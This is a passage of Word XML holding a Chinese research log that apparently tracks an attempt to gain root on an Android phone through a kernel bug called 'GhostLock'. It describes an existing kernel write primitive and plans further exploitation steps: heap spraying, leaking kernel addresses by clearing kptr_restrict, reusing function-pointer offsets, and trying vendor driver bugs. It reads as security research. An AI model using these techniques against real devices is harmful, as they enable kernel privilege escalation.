            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
                <w:strike w:val="0"/>
                <w:rFonts w:eastAsia="宋体" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>），不能作为写入值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Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="黑体"/>
          <w:color w:val="1F3B63"/>
          <w:sz w:val="27"/>
        </w:rPr>
        <w:t>A5 当前状态与剩余可行方向</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="8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设备仍然没有 root（`id -u` = 2000，SELinux Enforcing，Bootloader 全程未触碰）。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已经拿到的能力是：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每次开机 64 次、每次约 10 µs 的"任意可写地址 ← 0 或任意可写地址"写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，以及一条完整可复现的触发链（幽灵 waiter +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clock_adjtime(405)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+ util-clamp punch）。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缺的只有一件：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一块"内容可控 + 地址已知"的内核页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。可行的攻法有三类，按性价比排序：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给回收本身加验证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：不再依赖 KernelSnitch 的"命中即真"，而是让 spray 之后</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
          <w:strike w:val="0"/>
          <w:rFonts w:eastAsia="宋体" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>由内核替我们确认页内容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——例如把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waiter-&gt;lock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指向候选页、用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tree_r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做一次"只写我们自己 scratch"的幂等写，再通过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optmem_max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之外的第二个可读 .data 变量做交叉确认；或对多个候选页各发一发（现在每发只 10 µs、一次开机可跑几十发，成本已大幅下降）。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换一条泄露链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：一次零写把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kptr_restrict=0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，从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/proc/net/tcp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%pK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拿到真实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struct sock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堆地址；堆地址一旦已知，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struct sock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内部就有内核自己写入的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
          <w:strike w:val="0"/>
          <w:rFonts w:eastAsia="宋体" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>函数指针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sk_data_ready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sk_write_space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/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sk_timer.function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），可用作"跳板位于可写内存"的落点，配合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fops = &amp;sock-&gt;callback − 0x28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的偏移复用。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:spacing w:after="40" w:line="324" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
          <w:strike w:val="0"/>
          <w:rFonts w:eastAsia="宋体" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>换漏洞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>：本机的厂商模块（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bcmdhd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1.8 MB、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rmnet_core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、kgsl/adreno）与 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:strike w:val="0"/>
          <w:color w:val="8B1C1C"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>ion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是更大的攻击面；若目标是"临时 root"，一条自带读泄露的漏洞（例如 kgsl 的 GPU 命令流类问题）会比继续推 GhostLock 的最后一公里更省事。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="80" w:line="324" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:strike w:val="0"/>
          <w:rFonts w:eastAsia="宋体" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>方法论上，今天最重要的收获是把"能不能写"和"能不能读"这两件事彻底分开了：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
          <w:strike w:val="0"/>
          <w:rFonts w:eastAsia="宋体" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>GhostLock 在这台机器上给了可靠的写，但没有给任何读；而没有读，就没有可控内容的页；没有可控内容的页，写就够不到代码。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:strike w:val="0"/>
          <w:rFonts w:eastAsia="宋体" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 这条推理链本身，比再多打十发 fire 更有价值。</w:t>
      </w:r>
    </w:p>
    <w:sectPr w:rsidR="00FC693F" w:rsidRPr="0006063C" w:rsidSect="00034616">
      <w:footerReference w:type="default" r:id="rId9"/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separate"/>
    </w:r>
    <w:r>
      <w:rPr>
        <w:sz w:val="16"/>
      </w:rPr>
      <w:t>（在此按 F9 更新目录/页码）</w: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